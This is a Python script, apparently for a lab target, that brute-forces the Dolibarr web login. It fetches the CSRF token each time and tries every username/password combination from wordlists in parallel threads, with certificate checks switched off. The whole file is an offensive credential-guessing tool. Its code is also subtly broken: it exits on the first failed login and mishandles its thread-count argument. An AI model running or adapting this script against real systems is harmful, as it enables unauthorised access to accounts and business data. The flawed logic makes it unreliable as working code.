import requests
import sys
import time
import re
from concurrent.futures import ThreadPoolExecutor

URL = None
USERNAMES_FILE = None
PASSWORDS_FILE = None
MAX_THREADS = 10  # Максимальное количество потоков

def login(session, url, token, username, password):
    data = {
        "token": token,
        "username": username,
        "password": password,
        "actionlogin": "login"
    }
    r = session.post(f"{url}/", data=data, verify=False)

    if "Logout" not in r.text:
        print(f"[!] Authentication failed! {r.status_code}")
        sys.exit(1)
    else:
        print(f"Login successful with username: {username} and password: {password}")
        return True
    return False

def attempt_login(username, password):
    session = requests.Session()
    r = session.get(URL)
    token = re.search("\"anti-csrf-newtoken\" content=\"(.+)\"", r.text).group(1).strip()
    print(f"Request token: {token}")
    if login(session, URL, token, username, password):
        return True
    return False

def main():

    with open(USERNAMES_FILE, 'r') as uf:
        usernames = [line.strip() for line in uf.readlines()]
    
    with open(PASSWORDS_FILE, 'r') as pf:
        passwords = [line.strip() for line in pf.readlines()]
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for username in usernames:
            for password in passwords:
                futures.append(executor.submit(attempt_login, username, password))
        
        for future in futures:
            if future.result():
                print("Stopping further attempts as we have a successful login.")
                executor.shutdown(wait=False)
                return

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 dolibarr.py http://dolibarr.stf usernames_file passwords_file threads_count")
        sys.exit(1)
    URL = sys.argv[1]
    USERNAMES_FILE = sys.argv[2]
    PASSWORDS_FILE = sys.argv[3]
    MAX_THREADS = int(sys.argv[4])
    main()
